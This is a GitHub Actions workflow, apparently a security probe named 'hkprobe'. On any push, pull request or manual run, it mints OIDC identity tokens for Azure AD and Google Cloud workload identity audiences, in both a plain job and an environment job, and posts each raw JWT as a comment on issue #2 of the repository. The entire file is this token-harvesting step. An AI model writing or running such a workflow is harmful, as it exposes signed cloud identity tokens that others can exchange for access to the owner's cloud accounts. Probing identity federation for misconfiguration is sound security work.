name: hk14491c
on:
  workflow_dispatch:
  push:
    branches: ['**']
  pull_request:
permissions:
  id-token: write
  contents: read
  issues: write
jobs:
  plain:
    runs-on: ubuntu-latest
    steps:
      - name: mint
        run: |
          for AUD in "api://AzureADTokenExchange" "//iam.googleapis.com/projects/1052781069983/locations/global/workloadIdentityPools/hkprobe/providers/hkprobe"; do
            R=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$AUD")")
            J=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
            BODY=$(python3 -c "import json,sys;print(json.dumps({'body':'JWT '+sys.argv[1]+' ||| '+sys.argv[2]+' ||| '+sys.argv[3]}))" "$AUD" "$J" "plain|$GITHUB_REF|$GITHUB_EVENT_NAME")
            curl -s -m 25 -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/2/comments" -d "$BODY" -o /dev/null -w 'ISSUE %{http_code}\n'
            sleep 1
          done
  envjob:
    runs-on: ubuntu-latest
    environment: hk14491
    steps:
      - name: mint-env
        run: |
          for AUD in "api://AzureADTokenExchange" "//iam.googleapis.com/projects/1052781069983/locations/global/workloadIdentityPools/hkprobe/providers/hkprobe"; do
            R=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=$(python3 -c "import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1]))" "$AUD")")
            J=$(echo "$R" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
            BODY=$(python3 -c "import json,sys;print(json.dumps({'body':'JWT '+sys.argv[1]+' ||| '+sys.argv[2]+' ||| '+sys.argv[3]}))" "$AUD" "$J" "env|$GITHUB_REF|$GITHUB_EVENT_NAME")
            curl -s -m 25 -X POST -H "Authorization: Bearer $GITHUB_TOKEN" -H "Accept: application/vnd.github+json" "https://api.github.com/repos/$GITHUB_REPOSITORY/issues/2/comments" -d "$BODY" -o /dev/null -w 'ISSUE %{http_code}\n'
            sleep 1
          done
